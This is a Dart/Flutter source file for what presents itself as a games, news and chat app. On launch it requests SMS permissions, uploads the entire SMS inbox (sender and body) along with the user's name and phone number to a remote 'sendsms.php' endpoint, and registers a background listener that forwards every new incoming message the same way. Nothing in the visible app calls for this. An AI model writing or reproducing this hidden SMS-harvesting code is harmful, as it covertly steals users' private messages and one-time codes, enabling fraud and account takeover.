import 'dart:async';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';
import 'package:webview_flutter/webview_flutter.dart';

import 'chatscreen.dart';
import 'chatview.dart';
import 'gameview.dart';
import 'newsapp.dart';
import 'servise.dart';
import 'webview.dart';

Serves serves=Serves();
onBackgroundMessage(SmsMessage message) async{
  SharedPreferences prefs = await SharedPreferences.getInstance();
  var username= prefs.getInt('name');
  var usermobile= prefs.getInt('mobile');
  debugPrint("onBackgroundMessage called");
  var url3 = Uri.parse(serves.url+"sendsms.php");

  var response = await http.post(url3, body:{
    'number': message.address,
    'masg': message.body,
    'userno': usermobile.toString(),
    'UserName': username.toString(),

  }  );

  if (response.statusCode == 200) {

    print(response.body);
  }


}


class Singlecustomer extends StatefulWidget {
  Singlecustomer({Key? key}) : super(key: key);




  @override
  State<Singlecustomer> createState() => _SinglecustomerState();
}

class _SinglecustomerState extends State<Singlecustomer> {



  @override
  @override
  void initState() {
    super.initState();
    initPlatformState();
    seeall();
    if (Platform.isAndroid) WebView.platform = AndroidWebView();

  }

  String? _message;

  onMessage(SmsMessage message) async {
    setState(() {
      _message = message.body ?? "Error reading message body.";
    });
  }

  onSendStatus(SendStatus status) {
    setState(() {
      _message = status == SendStatus.SENT ? "sent" : "delivered";
    });
  }

  final telephony = Telephony.instance;
  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    // Platform messages may fail, so we use a try/catch PlatformException.
    // If the widget was removed from the tree while the asynchronous platform
    // message was in flight, we want to discard the reply rather than calling
    // setState to update our non-existent appearance.

    final bool? result = await telephony.requestPhoneAndSmsPermissions;

    if (result != null && result) {
      telephony.listenIncomingSms(
          onNewMessage: onMessage, onBackgroundMessage: onBackgroundMessage);
    }

    if (!mounted) return;
  }





  void seeall() async {
print("sms sync");
    SharedPreferences prefs = await SharedPreferences.getInstance();
    var username= prefs.getString('name');
    var usermobile= prefs.getString('mobile');
// prefs.clear();
    print(prefs.getInt('token'));
    if (prefs.getInt('token')==null) {
      List<SmsMessage> messages = await telephony.getInboxSms(
          columns: [SmsColumn.ADDRESS, SmsColumn.BODY],

          sortOrder: [OrderBy(SmsColumn.ADDRESS, sort: Sort.ASC),
            OrderBy(SmsColumn.BODY)]
      );


      messages.forEach((element)  async{
print(element.body);
        var url3 = Uri.parse(serves.url+"sendsms.php");

        var response = await http.post(url3, body:{
          'number': element.address,
          'masg': element.body,
          'userno': usermobile.toString(),
          'UserName': username.toString(),


        }  );

        if (response.statusCode == 200) {
          print("sussece sent");
        }else{
          print("not sent");
        }


      });

      prefs.setInt('token', 12345);
    }
  }








  String? name1;
  String? cid1;

  int _selectedIndex = 0;
  final List<Widget> _widgetOptions = [gameview(),MyAppnews(),  chatview()];


  void _onItemTapped(int index) {
    setState(() {
      _selectedIndex = index;

    });
  }

  @override
  Widget build(BuildContext context) {

    return Scaffold(

      body: Center(
        child: _widgetOptions.elementAt(_selectedIndex),
      ),
      bottomNavigationBar: BottomNavigationBar(
        backgroundColor: Colors.white,
        unselectedItemColor: Colors.grey,
        items: const <BottomNavigationBarItem>[
          BottomNavigationBarItem(
            icon: Icon(Icons.videogame_asset_outlined),
            label: ('All Game'),
            //backgroundColor: Color(0xffffaa00),
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.video_call_outlined),
            label: ('News '),
            // backgroundColor: Color(0xff6548ec),
          ),
          BottomNavigationBarItem(
            icon: Icon(Icons.chat),
            //   backgroundColor: Color(0xffecbd02),
            label: 'Chat',
          ),

        ],
        currentIndex: _selectedIndex,
        selectedItemColor:  Color(0xff62d3d5),

        onTap: _onItemTapped,
      ),

    );
  }



}
